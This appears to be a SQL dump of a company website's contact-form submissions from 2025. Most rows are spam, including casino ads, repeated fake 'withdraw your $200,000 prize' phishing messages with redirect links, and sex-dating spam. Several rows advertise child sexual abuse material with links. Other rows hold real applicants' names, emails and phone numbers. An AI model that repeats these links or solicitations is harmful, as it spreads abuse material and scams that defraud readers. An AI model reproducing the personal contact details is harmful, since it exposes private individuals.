(19, 'Michaelnip', 'hapori3839@v2ssr.com', '85342726651', 1, 'Bеst 0nline cаsіnо \r\nGet your bоnus 2500 Є + 55 Fs for frее singup \r\n \r\nhttps://bonus22.top10slotsgames.rent/kdy8e9', '', '2025-03-28 05:24:58', '2025-03-28 05:24:58'),
(20, 'Sherry Maye', 'maye.sherry@yahoo.com', '9805525513', 1, 'Dear Sir/Madam,\r\nWe are exploring long-term business collaborations and found your company of interest. May we kindly request your product catalog and pricing? Please  contact me via WhatsApp : +44 746 610 3247', '', '2025-03-28 22:46:11', '2025-03-28 22:46:11'),
(21, 'Marc Louvion', 'extremtechnology@gmail.com', '+1 9472148191', 1, 'Hi!\r\n\r\n\r\nAre you working on your own SaaS project or looking for a template for your clients? \r\n\r\nReply to this email, and I\'ll show you how our Next.js boilerplate can speed up your development\r\n\r\nMark Louvion', '', '2025-03-30 16:25:02', '2025-03-30 16:25:02'),
(22, 'Addy', 'venture4help@outlook.com', '3659223704', 1, 'I\'m Addy, a content writer specializing in blogs, articles, web copy, and product descriptions. My rate is $28 per 1000 words, with bulk discounts. I also provide AI & originality reports. \r\n\r\nEmail me at Venture4help@outlook.com', '', '2025-03-31 01:42:49', '2025-03-31 01:42:49'),
(23, 'HAMMAD HASSAN', 'HASSANHAMMAD406@GMAIL.COM', '03145615280', 1, NULL, '1743746168.pdf', '2025-04-04 03:56:08', '2025-04-04 03:56:08'),
(24, 'Ken Delancey', 'kenp2025x@yahoo.com', '240175798', 1, 'Was just browsing the site and was impressed the layout. Nicely design and great user experience. Just had to drop a message, have a great day! we7f8sd82', '', '2025-04-06 08:32:06', '2025-04-06 08:32:06'),
(25, 'Holographicjky', 'gtreude@msn.com', '82981895892', 1, 'antiquities. These are the Egyptian papyri', '', '2025-04-06 14:23:57', '2025-04-06 14:23:57'),
(26, 'Abi', 'projectsexpert222@outlook.com', '3155796281', 1, 'Need help with admin, marketing, web research, sending personalized emails, social media, content writing, bookkeeping, data entry, or website management? \r\n\r\nJust reply me at projectsexpert222@outlook.com to discuss ahead.', '', '2025-04-10 10:48:44', '2025-04-10 10:48:44'),
(27, 'Flexiblebfb', 'agibson@dgrlegal.com', '85417767824', 1, NULL, '', '2025-04-11 23:01:47', '2025-04-11 23:01:47'),
(28, 'Ascentqzo', 'acohen2610@comcast.net', '89255713192', 1, 'Duke de Montosier', '', '2025-04-15 07:17:36', '2025-04-15 07:17:36'),
(29, 'Ascentjch', 'nadine.stoner@m-solv.com', '88491671795', 1, 'and 12 thousand Georgian manuscripts', '', '2025-04-16 06:47:22', '2025-04-16 06:47:22'),
(30, 'Ansh', 'dataentry756@outlook.com', '272702087', 1, 'Need a custom lead list with verified C-level, VP, Director, Owner, Founder or any Job Designation contacts—direct phone, email, LinkedIn & company info? Just tell me how much data you need. \r\n\r\nEmail me at Dataentry756@outlook.com and let’s get started!', '', '2025-04-16 14:01:05', '2025-04-16 14:01:05'),
(31, 'Broncovex', 'gjohnson116@wi.rr.com', '88466819172', 1, 'mostly in monasteries.', '', '2025-04-17 02:46:50', '2025-04-17 02:46:50'),
(32, 'Tommyculky', 'xrumer23taw@gmail.com', '84222127714', 1, NULL, '', '2025-04-20 09:46:35', '2025-04-20 09:46:35'),
(33, 'Dominic', 'dominicsantarelli43@gmail.com', '3022288836', 0, 'Hi, I’m interested in discussing a potential web app project and would like to connect directly with uzair, as I have worked with him before and really appreciated his development quality. Please let me know the best way to get in touch.', '', '2025-04-21 15:28:45', '2025-04-21 15:28:45'),
(35, 'Tanya', 'taneva80@gmail.com', '3022288836', 1, 'Hello I live in the states and am looking to create a real-time web app, you came highly recommended. Let me know the best way to get in touch.', '', '2025-04-22 11:01:39', '2025-04-22 11:01:39'),
(36, 'Rigidezb', 'hasudb@yahoo.com', '88243244257', 1, 'secular brotherhoods of scribes.', '', '2025-04-22 12:35:45', '2025-04-22 12:35:45'),
(37, 'Jorgecb', 'caleb7r29@gmx.com', '81649461754', 1, 'Why wait? 1M is waiting on Reel Cash Vault. Your chance starts here! Start Winning Here => u.to/TPNgIA', '', '2025-04-23 03:23:59', '2025-04-23 03:23:59'),
(38, 'Edelbrockplv', 'mcain@eld4.org', '88859919112', 1, 'From many manuscripts of Antiquity', '', '2025-04-25 13:42:01', '2025-04-25 13:42:01'),
(39, 'Telecasternuc', 'hnkskjkkmjmekog6jessicadanielson16@gmail.com', '86492954988', 1, 'or their samples written', '', '2025-04-27 02:35:43', '2025-04-27 02:35:43'),
(40, 'trustgas', 'dashkasevast@yandex.ru', '89375946631', 1, 'Приобрести шампуни онлайн Ульяновск ХХХ \r\nhttps://trustgas.ru/ \r\n \r\nВсёгда лучшая продукция в наличии \r\n \r\n \r\nТолько онлайн \r\n16/03/2025', '', '2025-04-27 14:13:07', '2025-04-27 14:13:07'),
(41, 'Roverenult', 'mults@lumexmail.shop', '82589467441', 1, 'Всем привет! \r\nМеня зовут Анфим и я обожаю смотреть онлайн мультсериал Симпсоны на сайте https://simpsons.icu \r\nТам много интересных серий, которые Вам понравятся. \r\nПрисоединяйтесь!', '', '2025-04-28 15:06:20', '2025-04-28 15:06:20'),
(42, 'Cameron Hitt', 'cameron.hitt@gmail.com', '911199958', 1, 'We are currently seeking companies like yours for a potential long-term partnership. Could you kindly share your product offerings along with pricing details? Please  contact me on WhatsApp: +44 774 795 3399', '', '2025-04-29 05:26:55', '2025-04-29 05:26:55'),
(43, 'Genzjintaw', 'g9199451@gmail.com', '84574267673', 1, 'з§‘е­¦иЇ„дј°пјљдЅ зљ„з”џз‰©е­¦е№ґйѕ„дёЋе®ћй™…е№ґйѕ„з›ёе·®е¤љиїњпјџжµ‹иЇ•з»“жћњеЏЇиѓЅд»¤дєєйњ‡жѓЉпјЃ  - https://sites.google.com/view/usersage', '', '2025-04-30 03:19:35', '2025-04-30 03:19:35'),
(44, 'Ali Hassan', 'chaudharyalihassan572@gmail.com', '03193721472', 0, 'I am looking for a fresh Graduate Role if there is any available please let me know.', '1746017034.pdf', '2025-04-30 10:43:54', '2025-04-30 10:43:54'),
(45, 'Focusgjq', 'y.heider@ledvance.com', '81163635162', 1, NULL, '', '2025-05-01 19:35:07', '2025-05-01 19:35:07'),
(46, 'Allison Farris', 'osg533156@gmail.com', '816615967', 1, 'Hi, who can I talk to? I have leads to bring to you as a clients. Please reach out to me\r\n\r\nhttps://www.calendly.com/hati/30mins\r\n\r\nBest,\r\nAllison\r\nAccount Executive', '', '2025-05-02 05:04:07', '2025-05-02 05:04:07'),
(47, 'Bowenyu', 'marcoi1zb@hotmail.com', '88167977257', 1, 'The most addictive slot of this year. Spin once and join winners! Start Spinning Here -> is.gd/jXYH9Y', '', '2025-05-03 18:22:20', '2025-05-03 18:22:20'),
(48, 'Anthonygof', 'qualitymusic@gmail.com', '83695496114', 1, 'Hello, \r\n \r\nExclusive promo quality music for DJs https://sceneflac.blogspot.com \r\nMP3/FLAC, label, music videos. Fans giving you full access to exclusive electronic, rap, rock, trance, dance... music. \r\n \r\n0day team.', '', '2025-05-04 15:40:15', '2025-05-04 15:40:15'),
(51, 'LeeGaw', 'zekisuquc419@gmail.com', '81874389254', 1, 'Sveiki, es gribēju zināt savu cenu.', '', '2025-05-12 15:55:29', '2025-05-12 15:55:29'),
(52, 'Rubberjwu', 'cch@pacbell.net', '86484796798', 1, NULL, '', '2025-05-13 05:58:09', '2025-05-13 05:58:09'),
(53, 'Michaeldorse', 'floodservice.bot@gmail.com', '81415819992', 1, 'Hello Support! Hi, how are you?', '', '2025-05-17 04:56:46', '2025-05-17 04:56:46'),
(54, 'Jeffreyheany', 'gramlich24@schuetz72.hexagonaldrawings.com', '82978277583', 1, '<a href=\"https://riobet-kazino.ru\">https://riobet-kazino.ru</a>', '', '2025-05-23 13:19:27', '2025-05-23 13:19:27'),
(55, 'Generationbbb', 'amadeofrancis@gmail.com', '87231179159', 1, NULL, '', '2025-05-24 06:24:58', '2025-05-24 06:24:58'),
(56, 'Hello j93kid3\r\n >>> https://t.me/+l4pxw3t  #Lolllukazzzur333\r\n <<<  38352039', 'hru8@kirzzioh.store', 'Hi hi na7jzpz\r\n >>> https://t.me/+gy0j0fp  #Lolllukazzzur333\r\n <<<', 1, NULL, '', '2025-05-24 20:57:35', '2025-05-24 20:57:35'),
(57, 'Robertnob', 'nomin.momin+156z7@mail.ru', '85335659325', 1, 'Gwhduwdjiwhduwh uhiwdjiwjdeufhu jikodwfiewfiwjdjw jidwjosqdijwifi jiwdowidqoiowufeugewi uiwjdiwurfuwyruewiai fwhuwhwhfuwhduwijdw creativeitpark.org', '', '2025-05-26 02:24:17', '2025-05-26 02:24:17'),
(58, 'Scannerdjd', 'samanthakey0210@gmail.com', '81224228469', 1, NULL, '', '2025-05-26 05:19:04', '2025-05-26 05:19:04'),
(59, 'Muhammad arbaz Hameed', 'malikarbazhameed890@gmail.com', '03049676279', 1, 'Apply for flutter developer', '1748321334.pdf', '2025-05-27 02:48:54', '2025-05-27 02:48:54'),
(60, 'Claytonknist', 'warezmusicmp383@gmail.com', '84564738311', 1, 'Hello, \r\n \r\nClub music download FTP, quality music https://sceneflac.blogspot.com \r\nMP3/FLAC, label, music videos, soft, nfo. Fans giving you full access to exclusive electronic, rap, rock, trance, dance... music. \r\n \r\n0day team.', '', '2025-05-28 08:45:24', '2025-05-28 08:45:24'),
(61, 'Vintagehct', 'jprzeclawski@gmail.com', '89179157163', 1, NULL, '', '2025-05-28 10:18:11', '2025-05-28 10:18:11'),
(62, 'Carpetodp', 'office@deanfamilydds.com', '87489416458', 1, NULL, '', '2025-05-28 16:45:52', '2025-05-28 16:45:52'),
(63, 'Airbladexoe', 'akhshaya95@yahoo.com', '81394216999', 1, NULL, '', '2025-06-03 13:39:32', '2025-06-03 13:39:32'),
(64, 'Premiumplg', 'samir@crossbarmedia.com', '87916692579', 1, NULL, '', '2025-06-07 16:22:33', '2025-06-07 16:22:33'),
(65, 'MichaelMed', 'jk2f3kdf8dfk@gmail.com', '83862274761', 1, 'Ремонт телефонов в Кирове. +79229564040 - <a href=https://t.me/+79229564040>Сервисный центр Мобиопт</a>', '', '2025-06-09 04:18:21', '2025-06-09 04:18:21'),
(66, 'Avalanchecjp', 'rmskevin@gmail.com', '81513346589', 1, NULL, '', '2025-06-12 23:46:46', '2025-06-12 23:46:46'),
(67, 'Muhammad Ahsan', 'ahsansh19@gmail.com', '03340032844', 1, 'Is there any position available for Android Developer', '1749882154.pdf', '2025-06-14 04:22:34', '2025-06-14 04:22:34'),
(68, 'Thank you so much for this newsletter Thank you so much for this newsletter\r\n 4113681 https://t.me/ appleipnoneipad  !', 'ex.p.anseu.y.or.a.c.le.71@gmail.com', 'Thank you so much for this newsletter Thank you so much for this newsletter\r\n 4113681 https://t.me/ appleipnoneipad  !', 1, NULL, '', '2025-06-15 17:13:05', '2025-06-15 17:13:05'),
(69, 'Raj', 'businessprocessoutsourcing1@outlook.com', '565722485', 1, 'Hi, we help U.S. businesses manage daily tasks by offering skilled virtual manpower on an hourly basis. No contracts — just flexible, affordable support.\r\nReach us: Businessprocessoutsourcing1@outlook.com', '', '2025-06-20 06:16:28', '2025-06-20 06:16:28'),
(70, 'semmish', 'se.m.enva.tu.ti.n.h.o.m.e.w.or.k.198.808.2.8@gmail.com', '81958222292', 1, NULL, '', '2025-06-20 18:59:50', '2025-06-20 18:59:50'),
(71, 'Karan', 'socialmedia1145@outlook.com', '28967686', 1, 'Hi, we help businesses grow online with done-for-you social media management — content creation, scheduling, and strategy included. Focus on business while we handle your brand presence.\r\nContact: socialmedia1145@outlook.com', '', '2025-06-22 17:47:16', '2025-06-22 17:47:16'),
(72, 'HRM Bah Mbi', 'bahmmbi@gmail.com', '83538154135', 1, 'Attn. Director, \r\n \r\nWe are interested in your products. Please contact us with product details/catalog and price list if  your company can handle a bulk supply to Cameroon. \r\nPlease send your reply to bahmmbi3@aghemfondom.com \r\n \r\nHRM Bah Mbi', '', '2025-06-25 03:47:19', '2025-06-25 03:47:19'),
(73, 'RudolphTherb', 'sdadasfr@gmail.com', '85455283375', 1, 'Loli*ta fu*ck \r\n \r\nc*p pt*hc photos \r\n \r\n \r\nhttps://eit.tw/7A9Pcc \r\n \r\nhttps://go.euserv.org/17w', '', '2025-06-25 09:36:19', '2025-06-25 09:36:19'),
(74, 'Ahmad ali', 'maliahmad112200@gmail.com', '03189303079', 1, 'Hello I am Ahmad I am fresh graduate I am looking for internship to learn pursue a career in development', '1750885638.pdf', '2025-06-25 19:07:18', '2025-06-25 19:07:18'),
(75, 'TerenceSueli', 'asilva1040@gmail.com', '86983567191', 1, 'IMPORTANT! UNCLAIMED FUNDS: WITHDRAW $199,015.21 NOW! https://script.google.com/macros/s/AKfycby4DpBh8mIyGmUAmhKjLqZgO2WwF-cQlskyuUvETvmOnzADBXEN3hxrojhMpbpUA50kQg/exec/9s0t0f4u/7e5d/f/v9/8x5n9g1y/4q6y/p/vu/4z3u6k3q/3x6m/6/qt', '', '2025-06-26 08:44:37', '2025-06-26 08:44:37'),
(77, 'Dysonspk', 'caco2388@gmail.com', '89178821543', 1, NULL, '', '2025-06-26 09:18:28', '2025-06-26 09:18:28'),
(78, 'Praveen', 'youronlinepresence2@outlook.com', '444445533', 1, 'Hi, we help businesses improve their search rankings and get more traffic with proven SEO strategies — from on-page fixes to content and backlinks.\r\nLet’s talk: Youronlinepresence2@outlook.com', '', '2025-06-26 17:40:27', '2025-06-26 17:40:27'),
(79, 'TerenceSueli', 'tanyayoung13@outlook.com', '81424983975', 1, 'IMPORTANT MESSAGE! $199,795.02 Withdrawal Closing in 6H – Hurry! https://script.google.com/macros/s/AKfycbwiMfuvTYV5exZU9UPF2Us_sFQFfFJQRteSfouFBinjetMDGVcU7TFnzmYQQb90KendDA/exec/3q7l8a1u/4u8t/t/ao/9x7i9l1r/6v6q/m/q8/5c3o6d2u/7c5s/x/j3', '', '2025-06-30 19:27:11', '2025-06-30 19:27:11'),
(81, 'StevenTap', 'eeedsdd@gmail.com', '87854447874', 1, 'Loli*ta fu*ck \r\n \r\nc*p pt*hc photos \r\n \r\n \r\nhttps://2h.ae/ocLd \r\n \r\nhttps://go.euserv.org/17w', '', '2025-07-01 05:47:43', '2025-07-01 05:47:43'),
(82, 'TerenceSueli', 'msuggs51@gmail.com', '82586766257', 1, 'URGENT MESSAGE! Collect Your $199,805.70 Prize: Act Without Delay https://script.google.com/macros/s/AKfycbyqQUjbDHOmdrZFxVakk6yDMg_ReEUwzT6h2IU9oO3kn9CjSbUUD6He5YFFDORL7C_XtQ/exec/5z2u6f3o/4x5s/a/u0/3f3n6k3q/3c8q/h/ke/1r4l6l3u/7x8f/9/a5', '', '2025-07-02 13:03:25', '2025-07-02 13:03:25'),
(84, 'WilliamNok', 'leannelewis970@gmail.com', '84329649773', 1, 'Google Ads intends to pay you $144,000 for viewing ads on Google services - https://stp.store/bitrix/redirect.php?goto=https%3A%2F%2Ftelegra.ph%2Fgmt-06-12%3F6436', '', '2025-07-03 09:14:37', '2025-07-03 09:14:37'),
(86, 'Portablehiz', 'jefbet@roadrunner.com', '83868363822', 1, NULL, '', '2025-07-03 16:40:45', '2025-07-03 16:40:45'),
(87, 'tgkoknae', 'tgkoknaekb@rambler.ru', '82887646839', 1, 'Заходите узнать : остекление в Екатеринбурге <a href=https://t.me/oknaekaterinburg>пластиковые окна цены с установкой недорого</a> о теплом и холодном остеклении объектов. пластиковое остекление .', '', '2025-07-03 20:42:29', '2025-07-03 20:42:29'),
(88, 'TerenceSueli', 'qabild@gmail.com', '82867589689', 1, 'IMPORTANT! $199,875.56 WITHDRAWAL – ACT NOW OR LOSE IT https://script.google.com/macros/s/AKfycbzfVQlRPgS_cQlfL-N-QVi44J6uFd0qhMZ2Opp1btwMCV7A3CxqzX_kwxdAGmu4MXQc/exec/4a4n7g5r/4y7d/2/uu/0a4k6h1q/7r5m/5/o4/5v8h0k1p/4u7r/n/p2', '', '2025-07-05 01:47:39', '2025-07-05 01:47:39'),
(90, 'Michaelhoula', 'muh654eww@gmail.com', '87496867221', 1, 'Сервисный центр Мобиопт - <a href=https://go.2gis.com/6hvu6>Ремонт телефонов Киров +79229224040</a>', '', '2025-07-05 19:11:49', '2025-07-05 19:11:49'),
(91, 'TerenceSueli', 'j.smith81478@gmail.com', '81252426992', 1, 'URGENT MESSAGE! INSTANT FORTUNE: WITHDRAW YOUR $199,485.58 – YOUR DESTINY BECKONS! https://script.google.com/macros/s/AKfycbxdnDeSwbl4HkTjE0ME4YSwu0AowhVWz5re5TWvIpGvvadcq_0AwVMLHlFq1y-2dqdxBw/exec/3s2i9h2u/4z9m/y/e2/2f4t7d4i/5u0f/y/e7/3z1g8g4t/4x5m/w/vp', '', '2025-07-07 05:26:16', '2025-07-07 05:26:16'),
(93, 'TerenceSueli', 'lyramaejumawan@yahoo.com', '84118198453', 1, 'Hurry! Withdraw Your $200,225.09 Cash Bonus – Time is Ticking! https://2one.in/3Tn4q75', '', '2025-07-07 13:43:18', '2025-07-07 13:43:18'),
(95, 'TerenceSueli', 'hpotlnjo@compton.com', '86137268179', 1, 'Claim Your $200,125.97 Cash Prize Now or Never https://script.google.com/macros/s/AKfycbyfWTfEl2uFVn6VFliQDBOtbj2hE1IdrVWkOHCtzpyJUGNI9yAgyCM4pRyXlFXVP4fW/exec/3q2m7d5e/6m6t/2/uu/4r4p7k5u/5m6t/1/gp/9d8h0s4o/4y6m/4/q4', '', '2025-07-09 06:54:55', '2025-07-09 06:54:55'),
(97, 'TerenceSueli', 'ali03410629601@gmail.com', '83731685546', 1, 'Time-Sensitive: Claim Your $200,175.97! https://script.google.com/macros/s/AKfycbyE1wZW17YHP_ifh5bCze_crIdYAbXdcGFTKqryekP6U5MaMF6wMitH0ACKsyNRG6rT/exec/2z9u9a4i/5b9f/k/d5/2r6i9d3i/7u8r/u/j8/0c4b0l5o/3r9r/y/eo', '', '2025-07-11 05:26:15', '2025-07-11 05:26:15'),
(99, 'TerenceSueli', 'm.steele349@btinternet.com', '86528292348', 1, 'IMPORTANT! You’re Richer by $200,945.30! http://etebar.agri-es.ir/LinkClick.aspx?link=https%3A%2F%2Ftelegra.ph%2Fnfs-06-11%3F8985&mid=27173', '', '2025-07-11 15:51:20', '2025-07-11 15:51:20'),
(102, 'Blenderehg', 'krbs902@yahoo.com', '85262155329', 1, NULL, '', '2025-07-14 11:07:30', '2025-07-14 11:07:30'),
(103, 'Holographicvsp', 'grmarchesi@optonline.net', '88588614163', 1, NULL, '', '2025-07-22 16:00:26', '2025-07-22 16:00:26'),
(104, 'RainMachinetdt', 'rikrdr92@gmail.com', '81897645243', 1, NULL, '', '2025-07-25 19:21:42', '2025-07-25 19:21:42'),
(105, 'semmish', 's.e.me.nv.atu.t.inho.m.e.w.o.rk19.8.8.08.2.8.@gmail.com', '86298685615', 1, NULL, '', '2025-07-30 06:17:24', '2025-07-30 06:17:24'),
(106, 'Sommar Tariq', 'somirbhatti@gmail.com', '03289900002', 1, 'I\'m looking for a Flutter developer job opportunity — is there any available?', '1754042962.pdf', '2025-08-01 08:09:22', '2025-08-01 08:09:22'),
(107, 'obaid ullah', 'obaidullah.official123@gmail.com', '03103533473', 1, 'Request for internship Opportunity', '1754310998.docx', '2025-08-04 10:36:38', '2025-08-04 10:36:38'),
(108, 'Petrmish', 'pe.tr.tata.rs.kyhom.ew.o.rk.19.8.7.22.0.5.@gmail.com', '82281931973', 1, NULL, '', '2025-08-11 12:35:09', '2025-08-11 12:35:09'),
(109, 'Michaelenult', 'southpark@lumexmail.shop', '89497519487', 1, 'Всем привет! \r\nМеня зовут Макар и я обожаю смотреть онлайн мультсериал Южный Парк на сайте https://southpark-online.com \r\nТам много интересных серий, которые Вам понравятся. \r\nПрисоединяйтесь!', '', '2025-08-16 18:22:34', '2025-08-16 18:22:34'),
(110, 'EllisCathy', 'nestorlcm@gmail.com', '85268722894', 1, 'IMPORTANT! CLAIM YOUR $213,635.79 PRIZE: LIMITED SLOTS LEFT https://script.google.com/macros/s/AKfycbwl5fYmmGC8Urk6gwOU75glK180duP07BBRarn0hi93nEjoiJ_dG6NMW0pmyFYfe_GBYQ/exec/0a3j0l4o/7u7q/7/45/6c1p6j1e/7y6s/j/u1/9f0u6h2y/7t7t/5/1u', '', '2025-08-17 09:44:16', '2025-08-17 09:44:16'),
(112, 'mastkekb', 'okonnyymaster@rambler.ru', '84895712659', 1, 'Предлагаем ознакомиться : остекление в Екатеринбурге <a href=https://окна-екатеринбург.рф>окна в дом</a> о теплом и холодном остеклении объектов. безрамное остекление .', '', '2025-08-18 20:29:26', '2025-08-18 20:29:26'),
(113, 'EllisCathy', 'dixonjennifer1986@gmail.com', '81364353812', 1, 'URGENT! $213,965.59 Prize – 10 Minutes Left! https://script.google.com/macros/s/AKfycbwjFTC5imR2VcX-KPfJ4Rdog_yUedkC1BABoTYZxiBekR0O8Rphsu3-Ru3faD2Nbqts-w/exec/9c4g7s2u/7w0r/1/cr/8c6p7d4w/5w8t/8/15/9d1m8s3e/4e9s/u/o9', '', '2025-08-19 07:48:08', '2025-08-19 07:48:08'),
(115, 'EllisCathy', 'sleslie567@gmail.com', '84338712753', 1, 'URGENT! LAST CHANCE: SECURE YOUR $213,845.33 IN WINNINGS https://script.google.com/macros/s/AKfycbzr9thtaT9gsTNHp1y1ubI4ZNk3ioeEN1QK1R06Um1hmv3X6s3v2KBLYx43myA7Av8K/exec/7a8g6l5t/6c8m/s/o1/0r3i7a2u/7b6f/1/pw/7x2y8g3u/4w7q/j/21', '', '2025-08-20 13:40:26', '2025-08-20 13:40:26'),
(117, 'Chelsea Ferguson', 'info@chelseaferguson.com', '3223256524', 1, 'Hello,\r\n\r\nCreativeItPark.com is up for sale.\r\n\r\nI would like to inquire if acquiring this domain name from us could be beneficial for you?', '', '2025-08-21 05:16:16', '2025-08-21 05:16:16'),
(118, 'EllisCathy', 'smokeysam32@gmail.com', '82548279853', 1, 'IMPORTANT! EXCLUSIVE OFFER: COLLECT YOUR $213,885.54 IMMEDIATELY https://script.google.com/macros/s/AKfycbwfS_jEoVyHyViYvBx1q_z9dRhouNeNjfGmcVl8HVY2InO5YUqJECQnF8xCxqdlThw/exec/2d3t8s4t/4u9t/n/a9/2x9k6k3r/4c6g/w/3y/4z4n6h3i/6m8m/i/59', '', '2025-08-23 05:37:23', '2025-08-23 05:37:23'),
(120, 'EllisCathy', 'Angelcogan23@gmail.com', '85668396625', 1, 'URGENT! WITHDRAW $213,965.41 NOW – DON’T LOSE IT! https://script.google.com/macros/s/AKfycbwz0kZ3auAwlXxvbpAIvWwwCha_hoenuhCSUcaAO1nUX7SeYDNFeL0MxWJSpg99NOPm/exec/1f0b9l1e/5b0t/n/aw/4q4h7g1e/6r5g/2/d7/2w4n0h5q/6q5t/g/v8', '', '2025-08-25 04:09:41', '2025-08-25 04:09:41'),
(122, 'DonaldJag', 'nomin.momin+293p9@mail.ru', '85781999468', 1, 'Mfwdjwdhefiejfh fhiwuewuoioruiwes jkcsjhcksdlalsdjfhgh ejdowkkDIEWHRUEOFIW JIEWFOKDWDJEWIHFIEWFJEWFJIkhfjejfie efjfwjdfe creativeitpark.org', '', '2025-08-27 14:48:39', '2025-08-27 14:48:39'),
(123, 'Thank you so much for this newsletter Thank you so much for this newsletter\r\n 8557435 https://t.me appleipnoneipad !', 'f.agih.un70.7@gmail.com', 'Thank you so much for this newsletter Thank you so much for this newsletter\r\n 8557435 https://t.me appleipnoneipad !', 1, NULL, '', '2025-08-27 15:07:10', '2025-08-27 15:07:10'),
(125, 'RusselDon', 'terho.serlachius@gmail.com', '81272114826', 1, 'Your free access to top phones like the S24 begins here https://telegra.ph/Win-iPhones-Samsung-09-18-2727?0r6i0f1y4w6r6pw', '', '2025-09-18 12:59:09', '2025-09-18 12:59:09'),
(127, 'mudassir ali', 'muhammadmudassirmagray7786@gmail.com', '03479928151', 1, 'Any job or internship opportunity available', '1758434565.pdf', '2025-09-21 04:02:45', '2025-09-21 04:02:45'),
(128, 'Davidomice', 'jolene.westcott@bk.ru', '88968476782', 1, 'For reliable hardcover and softcover book printing, I recommend zxcprint.com[url]. Great prices and professional results.', '', '2025-09-22 07:19:49', '2025-09-22 07:19:49'),
(129, 'Yanira Robledo', 'yanira.robledo@yahoo.com', '9193740873', 1, 'Limited-time: get your message placed on 1M sites for $55.\r\n\r\n Get in touch at brandon.green@promarketinghub.shop', '', '2025-09-22 14:51:16', '2025-09-22 14:51:16'),
(130, 'Petrmish', 'p.et.rt.a.ta.rskyhom.e.w.o.rk.198722.0.5.@gmail.com', '84234221856', 1, NULL, '', '2025-09-22 17:28:51', '2025-09-22 17:28:51'),
(131, 'Lovie Synan', 'lovie.synan@gmail.com', '414319349', 1, 'A proven system which produces stealth web assets search engines index quickly… and drives natural traffic over time\r\n\r\nhttp://europa-168.site/GhostPages?domain=creativeitpark.org', '', '2025-09-23 06:41:52', '2025-09-23 06:41:52'),
(132, 'Briandoolo', 'mellimoppy@web.de', '85185555419', 1, 'Sex-Dating mit zig Millionen sexy Madchen http://www.main.nc.us/redirect/https://telegra.ph/Online-Dating-f%C3%BCr-Sex-09-23?7550', '', '2025-09-23 09:11:44', '2025-09-23 09:11:44'),
(134, 'Briandoolo', 'johnnychavarria1971@gmail.com', '87128724697', 1, 'Sexy women want to meet for sex only on this dating site https://biletikoff.ru/go.php?url=https%3A%2F%2Ftelegra.ph%2FOnline-dating-for-sex-09-24%3F6849', '', '2025-09-24 16:42:14', '2025-09-24 16:42:14'),
(136, 'Briandoolo', 'vinothini291281@gmail.com', '81629627281', 1, 'Depraved women are looking for sex for one time only on this site https://kompasnews.buzz/link/?url=telegra.ph%2FOnline-dating-for-sex-09-24%3F6351', '', '2025-09-26 04:14:05', '2025-09-26 04:14:05'),
(138, 'Briandoolo', 'Montelongosal6@gmail.com', '88997561953', 1, 'VERY BEAUTIFUL WOMEN WANT TO MEET FOR SEX ONLY HERE https://check-my-ip.co/goto/?url=https%3A%2F%2Ftelegra.ph%2FOnline-dating-for-sex-09-24%3F6521', '', '2025-09-27 15:31:12', '2025-09-27 15:31:12'),
(140, 'Briandoolo', 'kenchimpinde1@gmail.com', '82624838569', 1, 'Very sexy women meet for sex only on this site https://www.myrss.cn/frame/?url=https%3A%2F%2Ftelegra.ph%2FOnline-dating-for-sex-09-24%3F8223', '', '2025-09-29 04:42:45', '2025-09-29 04:42:45'),
(142, 'Briantub', 'mrtommyk@gmail.com', '83835172583', 1, 'Up to tryst loli porn cp pthc \r\n \r\n \r\nhttps://afpo.eu/jk6Va \r\n \r\nhttps://go.euserv.org/17w \r\n \r\nhttps://paste.gd/zxhmlDvZ', '1759562335.gif', '2025-10-04 05:18:55', '2025-10-04 05:18:55'),
(143, 'Robertfooth', 'no-reply790@gmail.com', '81169849963', 1, 'Hello, \r\n \r\nDownload club music https://www.0daymusic.org \r\n \r\n0-DAY TEAM', '', '2025-10-04 23:01:12', '2025-10-04 23:01:12'),
(144, 'Alexanderbig', 'lev26971@gmail.com', '86719562771', 1, 'Лучшая садовая техника: https://uyutmix.ru/', '', '2025-10-10 01:31:41', '2025-10-10 01:31:41'),
(145, 'Pablolk', 'samieu4yr@gmail.com', '82983846923', 1, 'Don’t hesitate. 500K is waiting on Mega Slots. Your turn starts here! Play Now Here => is.gd/pTfXw4', '', '2025-10-10 23:33:00', '2025-10-10 23:33:00'),
(146, 'Muhammad Junaid', 'm.junid044@gmail.com', '03323373338', 0, 'Hello Creative IT Park Team, I’m Muhammad Junaid, a BS Data Science graduate. I’m interested in full-time roles, internships, or trainee programs in Data Science, AI/ML, and analytics. Kindly share HR contact if not yourself.', '1760396320.pdf', '2025-10-13 20:58:40', '2025-10-13 20:58:40'),
(148, 'Stevenblows', 'vasilijtrusov3@gmail.com', '84115439468', 1, 'Top online Sportsbett! \r\nGet the bоnus 2400-Є and Freebet for frее singup \r\n \r\n \r\n \r\nhttps://abestnews.yachts/b2lgkfa', '', '2025-10-14 03:11:46', '2025-10-14 03:11:46'),
(149, 'RobertNah', 'e.le.fteriafernand.e.s@gmail.com', '83633712379', 1, '<a href=\"https://acheterviagragenerique.com/\">commander viagra en ligne</a> meilleur site viagra', '', '2025-10-15 20:51:36', '2025-10-15 20:51:36'),
(150, 'Edelbrockxkh', 'cellsgma24@spectrum.net', '88777544714', 1, NULL, '', '2025-10-17 14:56:13', '2025-10-17 14:56:13'),
(151, 'Jaleno7', 'hymend9t5@mail.com', '86529768623', 1, 'The clock is ticking. Your 500K prize won’t wait. Play today! Play Now Here => tinyurl.com/2752yzuw', '', '2025-10-21 06:06:53', '2025-10-21 06:06:53'),
(152, 'DonaldblUgs', 'touchngopainter@gmail.com', '89881731934', 1, 'iPhone 17, gaming laptops, gift cards, crypto & more! \r\nJoin now: https://telegra.ph/Get-a-gift-worth-up-to-10000077-10-23-8122', '', '2025-10-23 12:25:08', '2025-10-23 12:25:08'),
(154, 'WarnerUrify', 'bgxdfgbc@gmail.com', '85384821329', 1, 'Late-model loli porn \r\n \r\n \r\nhttps://afpo.eu/jk6Va \r\n \r\nhttps://go.euserv.org/17w', '', '2025-10-23 23:22:02', '2025-10-23 23:22:02'),
(155, 'Documentwpr', 'sgstickrod@gmail.com', '89492115969', 1, NULL, '', '2025-10-27 20:42:40', '2025-10-27 20:42:40'),
(156, 'Zodiacgfz', 'invest@securespace.com', '87858267861', 1, NULL, '', '2025-10-28 10:54:12', '2025-10-28 10:54:12'),
(157, 'Squiermty', 'zxzcarrzxz@gmail.com', '83591113912', 1, NULL, '', '2025-10-29 02:55:16', '2025-10-29 02:55:16'),
